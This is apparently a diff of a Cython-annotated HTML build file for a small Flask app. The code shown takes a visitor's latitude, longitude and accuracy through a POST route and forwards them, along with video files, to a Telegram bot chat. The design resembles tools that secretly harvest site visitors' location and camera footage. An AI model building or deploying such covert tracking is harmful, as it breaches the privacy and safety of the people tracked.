+<pre class="cython line score-54" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">034</span>: <span class="k">def</span><span class="w"> </span><span class="nf">send_video</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">BOT_TOKEN</span><span class="p">,</span> <span class="n">CHAT_ID</span><span class="p">):</span></pre>
 <pre class='cython code score-54 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_5send_video(PyObject *__pyx_self, 
 #if CYTHON_METH_FASTCALL
@@ -915,7 +990,7 @@ static PyObject *__pyx_pf_4main_4send_video(CYTHON_UNUSED PyObject *__pyx_self, 
   #endif
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_send_video, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 34, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">035</span>:     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"</pre>
+</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">035</span>:     <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">&quot;https://api.telegram.org/bot{BOT_TOKEN}/sendVideo&quot;</span></pre>
 <pre class='cython code score-9 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_v_BOT_TOKEN, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2[0] = __pyx_mstate_global-&gt;__pyx_kp_u_https_api_telegram_org_bot;
@@ -927,7 +1002,7 @@ static PyObject *__pyx_pf_4main_4send_video(CYTHON_UNUSED PyObject *__pyx_self, 
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_url = ((PyObject*)__pyx_t_3);
   __pyx_t_3 = 0;
-</pre><pre class="cython line score-61" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">036</span>:     with open(path, "rb") as f:</pre>
+</pre><pre class="cython line score-61" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">036</span>:     <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></pre>
 <pre class='cython code score-61 '>  /*with:*/ {
     __pyx_t_1 = NULL;
     __pyx_t_4 = 1;
@@ -1047,7 +1122,7 @@ static PyObject *__pyx_pf_4main_4send_video(CYTHON_UNUSED PyObject *__pyx_self, 
     goto __pyx_L1_error;
     __pyx_L16:;
   }
-</pre><pre class="cython line score-43" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">037</span>:         requests.post(url, data={"chat_id": CHAT_ID}, files={"video": f})</pre>
+</pre><pre class="cython line score-43" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">037</span>:         <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;chat_id&quot;</span><span class="p">:</span> <span class="n">CHAT_ID</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;video&quot;</span><span class="p">:</span> <span class="n">f</span><span class="p">})</span></pre>
 <pre class='cython code score-43 '>          __pyx_t_3 = NULL;
           <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_requests);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L7_error)</span>
           <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
@@ -1089,7 +1164,7 @@ static PyObject *__pyx_pf_4main_4send_video(CYTHON_UNUSED PyObject *__pyx_self, 
           }
           <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_7); __pyx_t_7 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">038</span>: </pre>
-<pre class="cython line score-67" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">039</span>: def send_location_telegram(lat, lon, accuracy, source, BOT_TOKEN, CHAT_ID):</pre>
+<pre class="cython line score-67" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">039</span>: <span class="k">def</span><span class="w"> </span><span class="nf">send_location_telegram</span><span class="p">(</span><span class="n">lat</span><span class="p">,</span> <span class="n">lon</span><span class="p">,</span> <span class="n">accuracy</span><span class="p">,</span> <span class="n">source</span><span class="p">,</span> <span class="n">BOT_TOKEN</span><span class="p">,</span> <span class="n">CHAT_ID</span><span class="p">):</span></pre>
 <pre class='cython code score-67 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_7send_location_telegram(PyObject *__pyx_self, 
 #if CYTHON_METH_FASTCALL
@@ -1250,7 +1325,7 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
   #endif
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_send_location_telegram, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 39, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-16" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">040</span>:     url_map = f"https://www.google.com/maps?q={lat},{lon}"</pre>
+</pre><pre class="cython line score-16" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">040</span>:     <span class="n">url_map</span> <span class="o">=</span> <span class="n">f</span><span class="s">&quot;https://www.google.com/maps?q={lat},{lon}&quot;</span></pre>
 <pre class='cython code score-16 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_v_lat, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_v_lon, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)</span>
@@ -1266,7 +1341,7 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_v_url_map = ((PyObject*)__pyx_t_4);
   __pyx_t_4 = 0;
-</pre><pre class="cython line score-35" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">041</span>:     msg = f"User location (via {source}):📍 {url_map}  Accuracy: {round(accuracy, 1)} meters estimated from user location"</pre>
+</pre><pre class="cython line score-35" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">041</span>:     <span class="n">msg</span> <span class="o">=</span> <span class="n">f</span><span class="s">&quot;User location (via {source}):📍 {url_map}  Accuracy: {round(accuracy, 1)} meters estimated from user location&quot;</span></pre>
 <pre class='cython code score-35 '>  __pyx_t_4 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_v_source, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 41, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_4);
   __pyx_t_2 = <span class='py_c_api'>PyTuple_New</span>(2);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)</span>
@@ -1297,7 +1372,7 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_v_msg = ((PyObject*)__pyx_t_1);
   __pyx_t_1 = 0;
-</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">042</span>:     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"</pre>
+</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">042</span>:     <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">&quot;https://api.telegram.org/bot{BOT_TOKEN}/sendMessage&quot;</span></pre>
 <pre class='cython code score-9 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_v_BOT_TOKEN, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_6[0] = __pyx_mstate_global-&gt;__pyx_kp_u_https_api_telegram_org_bot;
@@ -1309,7 +1384,7 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_url = ((PyObject*)__pyx_t_2);
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-12" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">043</span>:     try:</pre>
+</pre><pre class="cython line score-12" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">043</span>:     <span class="k">try</span><span class="p">:</span></pre>
 <pre class='cython code score-12 '>  {
     /*try:*/ {
 /* … */
@@ -1338,7 +1413,7 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
     <span class='pyx_c_api'>__Pyx_ExceptionReset</span>(__pyx_t_7, __pyx_t_8, __pyx_t_9);
     __pyx_L8_try_end:;
   }
-</pre><pre class="cython line score-38" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">044</span>:         requests.post(url, data={"chat_id": CHAT_ID, "text": msg})</pre>
+</pre><pre class="cython line score-38" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">044</span>:         <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;chat_id&quot;</span><span class="p">:</span> <span class="n">CHAT_ID</span><span class="p">,</span> <span class="s">&quot;text&quot;</span><span class="p">:</span> <span class="n">msg</span><span class="p">})</span></pre>
 <pre class='cython code score-38 '>      __pyx_t_1 = NULL;
       <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_4, __pyx_mstate_global-&gt;__pyx_n_u_requests);<span class='error_goto'> if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 44, __pyx_L3_error)</span>
       <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_4);
@@ -1375,7 +1450,7 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
         <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
       }
       <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-24" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">045</span>:     except Exception as e:</pre>
+</pre><pre class="cython line score-24" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">045</span>:     <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span></pre>
 <pre class='cython code score-24 '>    __pyx_t_13 = <span class='pyx_c_api'>__Pyx_PyErr_ExceptionMatches</span>(((PyObject *)(((PyTypeObject*)PyExc_Exception))));
     if (__pyx_t_13) {
       <span class='pyx_c_api'>__Pyx_AddTraceback</span>("main.send_location_telegram", __pyx_clineno, __pyx_lineno, __pyx_filename);
@@ -1431,7 +1506,7 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
       goto __pyx_L4_exception_handled;
     }
     goto __pyx_L5_except_error;
-</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">046</span>:         print("Failed to send location:", e)</pre>
+</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">046</span>:         <span class="k">print</span><span class="p">(</span><span class="s">&quot;Failed to send location:&quot;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span></pre>
 <pre class='cython code score-4 '>        __pyx_t_1 = NULL;
         __pyx_t_11 = 1;
         {
@@ -1444,8 +1519,8 @@ static PyObject *__pyx_pf_4main_6send_location_telegram(CYTHON_UNUSED PyObject *
         <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_4); __pyx_t_4 = 0;
       }
 </pre><pre class="cython line score-0">&#xA0;<span class="">047</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">048</span>: # ================= ROUTES =================</pre>
-<pre class="cython line score-34" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">049</span>: @app.route("/")</pre>
+<pre class="cython line score-0">&#xA0;<span class="">048</span>: <span class="c"># ================= ROUTES =================</span></pre>
+<pre class="cython line score-34" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">049</span>: <span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-34 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_9index(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
 static PyMethodDef __pyx_mdef_4main_9index = {"index", (PyCFunction)__pyx_pw_4main_9index, METH_NOARGS, 0};
@@ -1511,8 +1586,8 @@ static PyObject *__pyx_pf_4main_8index(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_index, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 49, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-0">&#xA0;<span class="">050</span>: def index():</pre>
-<pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">051</span>:     return render_template("index.html")</pre>
+</pre><pre class="cython line score-0">&#xA0;<span class="">050</span>: <span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span></pre>
+<pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">051</span>:     <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">&quot;index.html&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-17 '>  <span class='pyx_macro_api'>__Pyx_XDECREF</span>(__pyx_r);
   __pyx_t_2 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_render_template);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 51, __pyx_L1_error)</span>
@@ -1541,7 +1616,7 @@ static PyObject *__pyx_pf_4main_8index(CYTHON_UNUSED PyObject *__pyx_self) {
   __pyx_t_1 = 0;
   goto __pyx_L0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">052</span>: </pre>
-<pre class="cython line score-50" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">053</span>: @app.route("/upload/location", methods=["POST"])</pre>
+<pre class="cython line score-50" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">053</span>: <span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s">&quot;/upload/location&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;POST&quot;</span><span class="p">])</span></pre>
 <pre class='cython code score-50 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_11upload_location(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
 static PyMethodDef __pyx_mdef_4main_11upload_location = {"upload_location", (PyCFunction)__pyx_pw_4main_11upload_location, METH_NOARGS, 0};
@@ -1629,8 +1704,8 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   }
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_upload_location_2, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 53, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-0">&#xA0;<span class="">054</span>: def upload_location():</pre>
-<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">055</span>:     data = request.json</pre>
+</pre><pre class="cython line score-0">&#xA0;<span class="">054</span>: <span class="k">def</span><span class="w"> </span><span class="nf">upload_location</span><span class="p">():</span></pre>
+<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">055</span>:     <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span></pre>
 <pre class='cython code score-5 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_request);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 55, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_json);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 55, __pyx_L1_error)</span>
@@ -1638,7 +1713,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_data = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">056</span>:     latitude = data.get("latitude")</pre>
+</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">056</span>:     <span class="n">latitude</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&quot;latitude&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-4 '>  __pyx_t_1 = __pyx_v_data;
   <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_1);
   __pyx_t_3 = 0;
@@ -1651,7 +1726,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   }
   __pyx_v_latitude = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">057</span>:     longitude = data.get("longitude")</pre>
+</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">057</span>:     <span class="n">longitude</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&quot;longitude&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-4 '>  __pyx_t_1 = __pyx_v_data;
   <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_1);
   __pyx_t_3 = 0;
@@ -1664,7 +1739,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   }
   __pyx_v_longitude = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">058</span>:     accuracy = data.get("accuracy")</pre>
+</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">058</span>:     <span class="n">accuracy</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&quot;accuracy&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-4 '>  __pyx_t_1 = __pyx_v_data;
   <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_1);
   __pyx_t_3 = 0;
@@ -1677,7 +1752,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   }
   __pyx_v_accuracy = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">059</span>:     source = data.get("source", "unknown")</pre>
+</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">059</span>:     <span class="n">source</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&quot;source&quot;</span><span class="p">,</span> <span class="s">&quot;unknown&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-5 '>  __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_v_data, __pyx_mstate_global-&gt;__pyx_n_u_get);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 59, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_Call</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_tuple[1], NULL);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 59, __pyx_L1_error)</span>
@@ -1686,7 +1761,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   __pyx_v_source = __pyx_t_1;
   __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">060</span>: </pre>
-<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">061</span>:     BOT_TOKEN = app.config["BOT_TOKEN"]</pre>
+<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">061</span>:     <span class="n">BOT_TOKEN</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;BOT_TOKEN&quot;</span><span class="p">]</span></pre>
 <pre class='cython code score-8 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)</span>
@@ -1697,7 +1772,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_v_BOT_TOKEN = __pyx_t_1;
   __pyx_t_1 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">062</span>:     CHAT_ID = app.config["CHAT_ID"]</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">062</span>:     <span class="n">CHAT_ID</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;CHAT_ID&quot;</span><span class="p">]</span></pre>
 <pre class='cython code score-8 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 62, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L1_error)</span>
@@ -1709,7 +1784,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   __pyx_v_CHAT_ID = __pyx_t_1;
   __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">063</span>: </pre>
